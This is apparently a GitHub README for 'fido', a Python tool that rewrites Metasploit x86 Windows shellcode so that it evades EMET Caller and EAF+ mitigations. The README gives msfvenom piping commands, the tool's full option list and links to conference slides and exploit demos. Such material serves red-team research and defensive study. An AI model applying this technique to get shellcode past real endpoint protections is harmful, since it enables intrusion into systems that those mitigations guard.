# fido
Teaching an old shellcode new tricks

Give fido.py a x86 (32 bit) windows shellcode and it will strip off Stephen Fewer's hash API stub and replace it 
with something that bypasses EMET Caller and EAF+ checks but keeps the actual API calls in use.

# WARNING: If the 2nd stage payload uses the hash api from metasploit that loads Win APIs from the Export Address Table and jmp's into them, EMET will catch it.

If the warning didn't make sense, you might want to walk away or read up: 

* REcon BR Slides: https://github.com/secretsquirrel/fido/blob/master/REconBR_2017.pdf
* Demo1 (Hash Mangling POC): https://youtu.be/p3vFRx5dur0
* Demo2 (Tor Exploit POC): https://youtu.be/oqHT6Ienudg

## Usage

Can take input from stdout and output to stdout:
```
msfvenom -p windows/exec CMD=calc EXITFUNC=thread | ~/github/fido/testharness.py -m -b Tcpview.exe -p ExternGPA -t win10  > test.bin
```

Can take input from cmdline (via -s).

Want win7-win10 compatibility?  Use the following command:

```
msfvenom -p windows/exec CMD=calc EXITFUNC=thread | ~/github/fido/fido.py -p ExternGPA -l api-ms-win-core-libraryloader-l1-1-0.dll -d kernel32.dll > test.bin
```

This will use GetProcAddress in api-ms-win-core-libraryloader-l1-1-0.dll import from the kernel32.dll loaded module. 


Help output:

```
[!] -s is required either from cmd line flag or stdin <cat code.bin> | ./fido.py
usage: use "fido.py --help" for more information

This code imports metasploit sourced x86 windows shellcode that employs
Stephen Fewers Hash API stub and replaces it to bypass EMET Caller/EAF checks
and other bolt on mitigations. Accepts msfvenom output from stdin or from disk.
Doesn't do logic checks on provided payload to ensure it is x86 (32bit) or for windows
OS (up to you to be correct)

positional arguments:
  infile
  outfile

optional arguments:
  -h, --help            show this help message and exit
  -b TARGETBINARY, --targetbinary TARGETBINARY
                        Binary that shellcode will be customized to (Optional)
  -t OS, --OSTarget OS  OS target for looking for target DLL Import Tables: winXP, win7, win8, winVista, win10
  -s CODE, --shellcode CODE
                        x86 Win Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin
  -d DLL, --DLLName DLL
                        If you know the DLL in the IAT you are targeting enter this, no need for OS flag.
  -l IMPORTNAME, --Import IMPORTNAME
                        For use with -d and ExternGPA (-p), specify either 'kernel32.dll' or
                        'api-ms-win-core-libraryloader' -- you need to know with import you are targeting.
                        To know, run without -d for a list of candidates. Default is kernel32.dll but not always right!

  -m, --mangle          Mangle metasploit hash apis from their original values (you want to do this)
  -o OUTPUT, --output OUTPUT
                        How you would like your output: [c], [p]ython, c[s]harp Default: stdout.
  -p PARSER_STUB, --parser_stub PARSER_STUB
                        By default this assumes that GetProcAddress (GPA) is in the targetbinary's
                        Import Address Table (IAT) if no targetbinary or DLL name is provided.
                        Four options:
                            GPA  - GPA is in targetbinary IAT (default)
                            LLAGPA - LoadlibraryA(LLA)/GPA is in the targetbinary IAT (smallest shellcode option)
                            ExternGPA -- need DLLName or targetbinary to use
                            ExternLLAGPA -- need DLLName or targetbinary to use

  -n, --donotfail       Default: Fail if Stephen Fewers Hash API stub is not there, use -n to bypass
```






